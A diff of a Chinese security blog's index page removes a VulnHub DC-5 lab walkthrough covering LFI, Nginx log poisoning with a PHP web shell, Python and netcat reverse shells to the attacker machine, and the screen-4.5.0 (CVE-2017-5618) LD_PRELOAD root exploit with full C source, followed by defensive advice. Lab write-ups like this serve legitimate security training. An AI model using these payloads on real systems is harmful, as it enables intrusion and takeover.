@@ -141,7 +141,7 @@
   <nav class="site-state">
       <div class="site-state-item site-state-posts">
         <a href="/archives/">
-          <span class="site-state-item-count">127</span>
+          <span class="site-state-item-count">125</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
@@ -175,451 +175,6 @@
     </div>
 
     <div class="main-inner index posts-expand">
-
-    
-
-
-<div class="post-block">
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="https://congliang.github.io/VulnHub-DC5-writeup/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="YunShang">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="渗透测试实战记录">
-      <meta itemprop="description" content="渗透测试学习笔记 | 靶机实战 Writeup | 安全工具速查">
-    </span>
-
-    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
-      <meta itemprop="name" content=" | 渗透测试实战记录">
-      <meta itemprop="description" content="">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          <a href="/VulnHub-DC5-writeup/" class="post-title-link" itemprop="url">VulnHub DC-5靶机实战</a>
-        </h2>
-
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar"></i>
-      </span>
-      <span class="post-meta-item-text">发表于</span>
-
-      <time title="创建时间：2024-08-15 08:00:00" itemprop="dateCreated datePublished" datetime="2024-08-15T08:00:00+08:00">2024-08-15</time>
-    </span>
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar-check"></i>
-      </span>
-      <span class="post-meta-item-text">更新于</span>
-      <time title="修改时间：2026-06-04 23:34:45" itemprop="dateModified" datetime="2026-06-04T23:34:45+08:00">2026-06-04</time>
-    </span>
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-folder"></i>
-      </span>
-      <span class="post-meta-item-text">分类于</span>
-        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-          <a href="/categories/pentest/" itemprop="url" rel="index"><span itemprop="name">渗透测试</span></a>
-        </span>
-    </span>
-
-  
-</div>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-          <h2 id="靶机简介"><a href="#靶机简介" class="headerlink" title="靶机简介"></a>靶机简介</h2><p>DC-5 是 VulnHub 上 DC 系列靶机中的第五台，由 DCAU 设计。该靶机模拟了一台运行 Nginx + PHP 的 Linux Web 服务器，核心漏洞链为 <strong>文件包含（LFI）→ Nginx 日志投毒 → RCE</strong>，最终通过 <strong>screen-4.5.0 SUID 提权</strong>（CVE-2017-5618）获取 root 权限。</p>
-<table>
-<thead>
-<tr>
-<th>属性</th>
-<th>值</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>靶机名称</td>
-<td>DC-5</td>
-</tr>
-<tr>
-<td>难度</td>
-<td>中等</td>
-</tr>
-<tr>
-<td>目标</td>
-<td>读取 &#x2F;root&#x2F;flag.txt</td>
-</tr>
-<tr>
-<td>攻击机</td>
-<td>Kali Linux</td>
-</tr>
-<tr>
-<td>网络模式</td>
-<td>NAT（仅主机模式也可）</td>
-</tr>
-</tbody></table>
-<hr>
-<h2 id="渗透流程图"><a href="#渗透流程图" class="headerlink" title="渗透流程图"></a>渗透流程图</h2><pre class="mermaid">graph TD
-    A[开始] --> B[主机发现: arp-scan / netdiscover]
-    B --> C[端口扫描: nmap]
-    C --> D{识别服务}
-    D --> E[HTTP 80: Nginx]
-    D --> F[RPC 111: rpcbind]
-    D --> G[SSH 22 过滤]
-    E --> H[目录扫描: dirb/gobuster]
-    H --> I[浏览网站, 发现 Contact 表单]
-    I --> J[测试 Contact 表单, 发现 LFI]
-    J --> K[确认 LFI: /etc/passwd 等]
-    K --> L[思路: LFI 如何转 RCE?]
-    L --> M[Nginx 日志投毒]
-    M --> N[Burp 抓包, User-Agent 注入 PHP 代码]
-    N --> O[访问 /var/log/nginx/access.log 触发代码执行]
-    O --> P[获得反弹 shell]
-    P --> Q[基础信息收集: uname, SUID, cron 等]
-    Q --> R[发现 screen-4.5.0 SUID]
-    R --> S[搜索漏洞: searchsploit screen]
-    S --> T[CVE-2017-5618 本地提权]
-    T --> U[编译/执行 exploit]
-    U --> V[获得 root shell]
-    V --> W[读取 /root/flag.txt]
-    W --> X[结束]</pre>
-
-<hr>
-<h2 id="一、环境准备"><a href="#一、环境准备" class="headerlink" title="一、环境准备"></a>一、环境准备</h2><h3 id="1-1-下载与导入"><a href="#1-1-下载与导入" class="headerlink" title="1.1 下载与导入"></a>1.1 下载与导入</h3><p>从 VulnHub 官网下载 DC-5 的 OVA 镜像文件，使用 VMware Workstation 或 VirtualBox 导入。网络适配器设置为 <strong>NAT 模式</strong>或<strong>仅主机模式</strong>，确保攻击机和靶机在同一网段。</p>
-<h3 id="1-2-攻击机信息"><a href="#1-2-攻击机信息" class="headerlink" title="1.2 攻击机信息"></a>1.2 攻击机信息</h3><p>本实战使用 Kali Linux 作为攻击机，IP 地址为 <code>192.168.10.128</code>（以实际环境为准）。</p>
-<hr>
-<h2 id="二、信息收集"><a href="#二、信息收集" class="headerlink" title="二、信息收集"></a>二、信息收集</h2><h3 id="2-1-主机发现"><a href="#2-1-主机发现" class="headerlink" title="2.1 主机发现"></a>2.1 主机发现</h3><p>首先通过 <code>arp-scan</code> 或 <code>netdiscover</code> 工具扫描局域网内存活主机，定位靶机 IP。</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> arp-scan -l</span><br></pre></td></tr></table></figure>
-
-<p>很快就能发现新增的 IP 地址，假设靶机 IP 为 <code>192.168.10.133</code>。</p>
-<p>也可以使用 <code>nmap</code> 进行存活主机扫描：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sn 192.168.10.0/24</span><br></pre></td></tr></table></figure>
-
-<h3 id="2-2-端口扫描"><a href="#2-2-端口扫描" class="headerlink" title="2.2 端口扫描"></a>2.2 端口扫描</h3><p>对靶机进行全端口扫描，识别开放的服务。</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sS -sV -p- -T4 192.168.10.133</span><br></pre></td></tr></table></figure>
-
-<p><strong>扫描结果：</strong></p>
-<table>
-<thead>
-<tr>
-<th>端口</th>
-<th>服务</th>
-<th>版本</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>80&#x2F;tcp</td>
-<td>HTTP</td>
-<td>nginx 1.6.2</td>
-</tr>
-<tr>
-<td>111&#x2F;tcp</td>
-<td>rpcbind</td>
-<td>2-4</td>
-</tr>
-<tr>
-<td>22&#x2F;tcp</td>
-<td>SSH</td>
-<td>filtered</td>
-</tr>
-<tr>
-<td>42376&#x2F;tcp</td>
-<td>status</td>
-<td>-</td>
-</tr>
-</tbody></table>
-<p>关键发现：</p>
-<ul>
-<li><strong>80 端口</strong>开放 Nginx 1.6.2 Web 服务</li>
-<li>SSH 端口被<strong>过滤</strong>（filtered），无法直接爆破</li>
-<li>rpcbind 服务开放但暂无可利用通道</li>
-</ul>
-<h3 id="2-3-目录扫描"><a href="#2-3-目录扫描" class="headerlink" title="2.3 目录扫描"></a>2.3 目录扫描</h3><p>使用 <code>dirb</code> 或 <code>gobuster</code> 对 Web 服务进行目录枚举。</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">dirb http://192.168.10.133</span><br><span class="line">gobuster <span class="built_in">dir</span> -u http://192.168.10.133 -w /usr/share/wordlists/dirb/common.txt</span><br></pre></td></tr></table></figure>
-
-<p>发现的目录和文件包括：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">/index.html</span><br><span class="line">/contact.php</span><br><span class="line">/thankyou.php</span><br><span class="line">/footer.php</span><br><span class="line">/css/</span><br><span class="line">/images/</span><br></pre></td></tr></table></figure>
-
-<h3 id="2-4-网站功能分析"><a href="#2-4-网站功能分析" class="headerlink" title="2.4 网站功能分析"></a>2.4 网站功能分析</h3><p>浏览器访问 <code>http://192.168.10.133</code>，网站是一个简洁的博客或公司首页。导航栏包含以下页面：</p>
-<ul>
-<li><strong>Home</strong> - 首页</li>
-<li><strong>About Us</strong> - 关于我们页</li>
-<li><strong>Contact</strong> - 联系表单页（<code>contact.php</code>）</li>
-<li><strong>Thank You</strong> - 感谢页（<code>thankyou.php</code>）</li>
-</ul>
-<p>重点关注 <code>/contact.php</code> 页面，它包含一个联系表单，允许用户提交姓名、邮箱、留言等信息。我们猜测该页面可能存在参数传递与文件包含漏洞。</p>
-<hr>
-<h2 id="三、漏洞发现：Contact-表单-LFI"><a href="#三、漏洞发现：Contact-表单-LFI" class="headerlink" title="三、漏洞发现：Contact 表单 LFI"></a>三、漏洞发现：Contact 表单 LFI</h2><h3 id="3-1-初步测试"><a href="#3-1-初步测试" class="headerlink" title="3.1 初步测试"></a>3.1 初步测试</h3><p>访问 <code>contact.php</code> 页面后，首先尝试修改 URL 参数。在浏览器地址栏中尝试：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.10.133/contact.php?file=test</span><br></pre></td></tr></table></figure>
-
-<p>页面内容发生变化——这意味着参数 <code>file</code> 被后端 PHP 脚本处理了。</p>
-<p>尝试经典的本地文件包含 Payload：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.10.133/contact.php?file=../../../../etc/passwd</span><br></pre></td></tr></table></figure>
-
-<p><strong>成功读取到 <code>/etc/passwd</code> 文件内容！</strong> 这确认了<strong>本地文件包含（LFI）漏洞</strong>的存在。</p>
-<h3 id="3-2-进一步验证"><a href="#3-2-进一步验证" class="headerlink" title="3.2 进一步验证"></a>3.2 进一步验证</h3><p>继续尝试读取更多系统文件以确认 LFI 的范围和权限：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 读取 passwd 文件</span></span><br><span class="line">curl <span class="string">&quot;http://192.168.10.133/contact.php?file=../../../../etc/passwd&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 读取 nginx 配置文件</span></span><br><span class="line">curl <span class="string">&quot;http://192.168.10.133/contact.php?file=../../../../etc/nginx/nginx.conf&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 读取 PHP 配置</span></span><br><span class="line">curl <span class="string">&quot;http://192.168.10.133/contact.php?file=../../../../etc/php5/fpm/php.ini&quot;</span></span><br></pre></td></tr></table></figure>
-
-<p>这些文件都能成功读取，说明 LFI 漏洞有效且权限足够。通过读取 <code>/etc/passwd</code> 我们发现系统中存在普通用户账户，但密码哈希存储在 <code>/etc/shadow</code> 中，通常情况下 Web 用户无法直接读取。</p>
-<hr>
-<h2 id="四、LFI-到-RCE：Nginx-日志投毒"><a href="#四、LFI-到-RCE：Nginx-日志投毒" class="headerlink" title="四、LFI 到 RCE：Nginx 日志投毒"></a>四、LFI 到 RCE：Nginx 日志投毒</h2><p>仅仅拥有 LFI 是不够的，我们需要将其升级为远程代码执行（RCE）。一个经典思路是<strong>日志文件投毒（Log Poisoning）</strong>。</p>
-<h3 id="4-1-确认-Nginx-日志路径"><a href="#4-1-确认-Nginx-日志路径" class="headerlink" title="4.1 确认 Nginx 日志路径"></a>4.1 确认 Nginx 日志路径</h3><p>通过 LFI 尝试读取 Nginx 访问日志：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.10.133/contact.php?file=../../../../var/log/nginx/access.log</span><br></pre></td></tr></table></figure>
-
-<p>成功读取到日志文件，并且可以看到之前的浏览器请求记录，包括 User-Agent、请求路径等信息。</p>
-<h3 id="4-2-原理分析"><a href="#4-2-原理分析" class="headerlink" title="4.2 原理分析"></a>4.2 原理分析</h3><p>Nginx 的访问日志会记录每一次 HTTP 请求的详细信息，其中包括 <code>User-Agent</code> 头部。如果我们能将 PHP 代码注入到 <code>User-Agent</code> 中，随后通过 LFI 去 <code>include</code> 该日志文件，PHP 引擎就会解析并执行嵌入在日志中的 PHP 代码。</p>
-<p>这就是<strong>日志投毒（Log Poisoning）攻击</strong>的核心思路。</p>
-<h3 id="4-3-Burp-Suite-投毒"><a href="#4-3-Burp-Suite-投毒" class="headerlink" title="4.3 Burp Suite 投毒"></a>4.3 Burp Suite 投毒</h3><p>使用 Burp Suite 拦截一次对网站的请求，将 <code>User-Agent</code> 替换为 PHP 一句话木马：</p>
-<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>192.168.10.133</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>&lt;?php system($_GET[&#x27;cmd&#x27;]); ?&gt;</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
-
-<p>发送该请求后，PHP 代码会被原样写入 Nginx 的 <code>access.log</code> 中。</p>
-<h3 id="4-4-触发代码执行"><a href="#4-4-触发代码执行" class="headerlink" title="4.4 触发代码执行"></a>4.4 触发代码执行</h3><p>再次通过 LFI 访问日志文件，并通过 <code>cmd</code> 参数传递系统命令：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.10.133/contact.php?file=../../../../var/log/nginx/access.log&amp;cmd=id</span><br></pre></td></tr></table></figure>
-
-<p>页面返回了类似以下内容，其中夹杂着 <code>id</code> 命令的执行结果：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uid=33(www-data) gid=33(www-data) groups=33(www-data)</span><br></pre></td></tr></table></figure>
-
-<p><strong>至此，LFI 成功转化为 RCE！</strong> 我们以 <code>www-data</code> 用户的身份在靶机上执行任意系统命令。</p>
-<h3 id="4-5-获取反弹-Shell"><a href="#4-5-获取反弹-Shell" class="headerlink" title="4.5 获取反弹 Shell"></a>4.5 获取反弹 Shell</h3><p>为了方便后续操作，我们通过 Python 反弹一个交互式 Shell。在 Kali 攻击机上开启监听：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvnp 4444</span><br></pre></td></tr></table></figure>
-
-<p>然后在浏览器或通过 <code>curl</code> 执行反弹 Shell 命令（注意 URL 编码）：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl <span class="string">&quot;http://192.168.10.133/contact.php?file=../../../../var/log/nginx/access.log&amp;cmd=nc -e /bin/bash 192.168.10.128 4444&quot;</span></span><br></pre></td></tr></table></figure>
-
-<p>如果没有 <code>-e</code> 选项的 netcat，可以尝试其他方式：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl <span class="string">&quot;http://192.168.10.133/contact.php?file=../../../../var/log/nginx/access.log&amp;cmd=python -c &#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\&quot;192.168.10.128\&quot;,4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\&quot;/bin/sh\&quot;,\&quot;-i\&quot;])&#x27;&quot;</span></span><br></pre></td></tr></table></figure>
-
-<p>Shell 成功反弹后，升级为更稳定的交互式 TTY：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">python -c <span class="string">&#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</span></span><br><span class="line"><span class="built_in">export</span> TERM=xterm</span><br><span class="line"><span class="comment"># 按 Ctrl+Z 将进程挂到后台，然后：</span></span><br><span class="line"><span class="built_in">stty</span> raw -<span class="built_in">echo</span>; <span class="built_in">fg</span></span><br></pre></td></tr></table></figure>
-
-<hr>
-<h2 id="五、提权：screen-4-5-0-SUID（CVE-2017-5618）"><a href="#五、提权：screen-4-5-0-SUID（CVE-2017-5618）" class="headerlink" title="五、提权：screen-4.5.0 SUID（CVE-2017-5618）"></a>五、提权：screen-4.5.0 SUID（CVE-2017-5618）</h2><h3 id="5-1-基础信息收集"><a href="#5-1-基础信息收集" class="headerlink" title="5.1 基础信息收集"></a>5.1 基础信息收集</h3><p>获得 <code>www-data</code> Shell 后，我们需要收集系统信息，寻找提权路径。</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 查看系统版本</span></span><br><span class="line"><span class="built_in">uname</span> -a</span><br><span class="line"><span class="built_in">cat</span> /etc/issue</span><br><span class="line"><span class="built_in">cat</span> /etc/*-release</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看 SUID 文件</span></span><br><span class="line">find / -perm -4000 -<span class="built_in">type</span> f 2&gt;/dev/null</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看当前用户权限</span></span><br><span class="line"><span class="built_in">id</span></span><br><span class="line"><span class="built_in">sudo</span> -l</span><br></pre></td></tr></table></figure>
-
-<p>在 SUID 文件列表中出现了一个引人注目的程序：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/usr/bin/screen-4.5.0</span><br></pre></td></tr></table></figure>
-
-<h3 id="5-2-漏洞确认"><a href="#5-2-漏洞确认" class="headerlink" title="5.2 漏洞确认"></a>5.2 漏洞确认</h3><p><code>screen</code> 是一个经典的终端复用器，但版本 <strong>4.5.0</strong> 存在一个已知的本地提权漏洞 <strong>CVE-2017-5618</strong>。</p>
-<p><strong>漏洞原理：</strong> screen 4.5.0 在编译时没有正确启用特权分离模式。当 screen 以 SUID root 身份运行时，攻击者可以通过精心构造的配置文件或调试选项，触发 screen 以 root 权限执行任意操作，从而完成本地提权。</p>
-<p>使用 <code>searchsploit</code> 搜索相关 Exploit：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">searchsploit screen 4.5.0</span><br></pre></td></tr></table></figure>
-
-<p>找到对应的 Exploit 脚本（例如 <code>41154.sh</code>）。</p>
-<h3 id="5-3-查看-Exploit-内容"><a href="#5-3-查看-Exploit-内容" class="headerlink" title="5.3 查看 Exploit 内容"></a>5.3 查看 Exploit 内容</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">searchsploit -m 41154</span><br><span class="line"><span class="built_in">cat</span> 41154.sh</span><br></pre></td></tr></table></figure>
-
-<p>该 Exploit 的核心原理是：</p>
-<ol>
-<li>编译一个共享库文件（<code>.so</code>），在其中定义 <code>getgid</code> 函数，该函数会调用 <code>setuid(0)</code> 和 <code>setgid(0)</code> 然后执行 <code>/bin/sh</code></li>
-<li>通过设置 <code>LD_PRELOAD</code> 环境变量，使 screen 在运行时优先加载该恶意的共享库</li>
-<li>screen 具有 SUID 权限，加载 <code>.so</code> 后以 root 身份执行 shell</li>
-</ol>
-<p>核心 Payload（libhax.c）：</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">__attribute__ ((__constructor__))</span><br><span class="line"><span class="type">void</span> <span class="title function_">dropshell</span><span class="params">(<span class="type">void</span>)</span>&#123;</span><br><span class="line">    chown(<span class="string">&quot;/tmp/rootshell&quot;</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    chmod(<span class="string">&quot;/tmp/rootshell&quot;</span>, <span class="number">04755</span>);</span><br><span class="line">    unlink(<span class="string">&quot;/etc/ld.so.preload&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] done!\n&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>以及 rootshell.c：</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span>&#123;</span><br><span class="line">    setuid(<span class="number">0</span>);</span><br><span class="line">    setgid(<span class="number">0</span>);</span><br><span class="line">    seteuid(<span class="number">0</span>);</span><br><span class="line">    setegid(<span class="number">0</span>);</span><br><span class="line">    execvp(<span class="string">&quot;/bin/sh&quot;</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<h3 id="5-4-执行提权"><a href="#5-4-执行提权" class="headerlink" title="5.4 执行提权"></a>5.4 执行提权</h3><p>将 Exploit 脚本内容分步在靶机上执行。由于靶机可能没有安装 <code>gcc</code>，我们需要分两步走：</p>
-<p><strong>方案一：在靶机上编译（如果有 gcc）</strong></p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> /tmp</span><br><span class="line"><span class="comment"># 将 exploit 代码写入文件</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;...&#x27;</span> &gt; libhax.c</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;...&#x27;</span> &gt; rootshell.c</span><br><span class="line"></span><br><span class="line">gcc -fPIC -shared -ldl -o libhax.so libhax.c</span><br><span class="line">gcc -o rootshell rootshell.c</span><br><span class="line"></span><br><span class="line"><span class="comment"># 利用 screen-4.5.0 的 SUID 漏洞触发提权</span></span><br><span class="line"><span class="built_in">cd</span> /etc</span><br><span class="line"><span class="built_in">umask</span> 000</span><br><span class="line">screen -D -m -L ld.so.preload <span class="built_in">echo</span> -ne  <span class="string">&quot;\x0a/tmp/libhax.so&quot;</span></span><br><span class="line">screen -<span class="built_in">ls</span></span><br><span class="line">/tmp/rootshell</span><br></pre></td></tr></table></figure>
-
-<p><strong>方案二：在攻击机上交叉编译后上传</strong></p>
-<p>如果靶机缺少编译工具，可以在 Kali 上编译好二进制文件，然后通过 Python HTTP Server 传输：</p>
-<p>Kali 上：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">gcc -fPIC -shared -ldl -o libhax.so libhax.c</span><br><span class="line">gcc -o rootshell rootshell.c</span><br><span class="line">python3 -m http.server 80</span><br></pre></td></tr></table></figure>
-
-<p>靶机上：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> /tmp</span><br><span class="line">wget http://192.168.10.128/libhax.so</span><br><span class="line">wget http://192.168.10.128/rootshell</span><br><span class="line"><span class="built_in">chmod</span> +x rootshell</span><br><span class="line"></span><br><span class="line"><span class="comment"># 执行提权</span></span><br><span class="line"><span class="built_in">cd</span> /etc</span><br><span class="line"><span class="built_in">umask</span> 000</span><br><span class="line">screen -D -m -L ld.so.preload <span class="built_in">echo</span> -ne <span class="string">&quot;\x0a/tmp/libhax.so&quot;</span></span><br><span class="line">screen -<span class="built_in">ls</span></span><br><span class="line">/tmp/rootshell</span><br></pre></td></tr></table></figure>
-
-<h3 id="5-5-获取-Flag"><a href="#5-5-获取-Flag" class="headerlink" title="5.5 获取 Flag"></a>5.5 获取 Flag</h3><p>成功获得 root shell 后：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">whoami</span></span><br><span class="line"><span class="comment"># root</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">cd</span> /root</span><br><span class="line"><span class="built_in">ls</span> -la</span><br><span class="line"><span class="built_in">cat</span> flag.txt</span><br></pre></td></tr></table></figure>
-
-<p>Flag 内容通常形如：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">################################</span><br><span class="line">#   Congratulations!          #</span><br><span class="line">#   You have rooted DC-5!     #</span><br><span class="line">#   Flag: [随机字符串]          #</span><br><span class="line">################################</span><br></pre></td></tr></table></figure>
-
-<hr>
-<h2 id="六、攻击链总结"><a href="#六、攻击链总结" class="headerlink" title="六、攻击链总结"></a>六、攻击链总结</h2><table>
-<thead>
-<tr>
-<th>阶段</th>
-<th>技术</th>
-<th>要点</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>信息收集</td>
-<td>nmap &#x2F; dirb</td>
-<td>发现 HTTP 80 + Nginx</td>
-</tr>
-<tr>
-<td>漏洞发现</td>
-<td>手动测试</td>
-<td>Contact 表单 LFI</td>
-</tr>
-<tr>
-<td>LFI → RCE</td>
-<td>Nginx 日志投毒</td>
-<td>User-Agent 注入 PHP 代码</td>
-</tr>
-<tr>
-<td>建立立足点</td>
-<td>反弹 Shell</td>
-<td>nc &#x2F; Python Reverse Shell</td>
-</tr>
-<tr>
-<td>本地提权</td>
-<td>CVE-2017-5618</td>
-<td>screen-4.5.0 SUID 漏洞</td>
-</tr>
-<tr>
-<td>达成目标</td>
-<td>读取 Flag</td>
-<td>&#x2F;root&#x2F;flag.txt</td>
-</tr>
-</tbody></table>
-<p><strong>攻击链全貌：</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Port Scan → Web 发现 → LFI 漏洞 → Nginx 日志投毒 → RCE → 反弹 Shell</span><br><span class="line">→ SUID 查找 → screen-4.5.0 CVE-2017-5618 → Root → Flag</span><br></pre></td></tr></table></figure>
-
-<hr>
-<h2 id="七、防御建议"><a href="#七、防御建议" class="headerlink" title="七、防御建议"></a>七、防御建议</h2><ol>
-<li><strong>输入验证</strong>：对 <code>contact.php</code> 中的 <code>file</code> 参数进行白名单校验，禁止包含路径遍历字符。</li>
-<li><strong>关闭 allow_url_include</strong>：在 <code>php.ini</code> 中设置 <code>allow_url_include = Off</code>，并严格限制 <code>include</code> 的文件路径。</li>
-<li><strong>日志目录权限</strong>：Nginx 日志文件的权限应设为仅 root 可写，防止 Web 进程写入日志。</li>
-<li><strong>更新软件</strong>：将 <code>screen</code> 升级到修复版本（4.5.1+），或移除不必要的 SUID 位。</li>
-<li><strong>最小权限原则</strong>：检查系统中所有 SUID 二进制文件，移除非必要的 SUID 权限。</li>
-</ol>
-<hr>
-<h2 id="八、参考链接"><a href="#八、参考链接" class="headerlink" title="八、参考链接"></a>八、参考链接</h2><ul>
-<li><a target="_blank" rel="noopener" href="https://www.vulnhub.com/entry/dc-5,314/">VulnHub DC-5 官方页面</a></li>
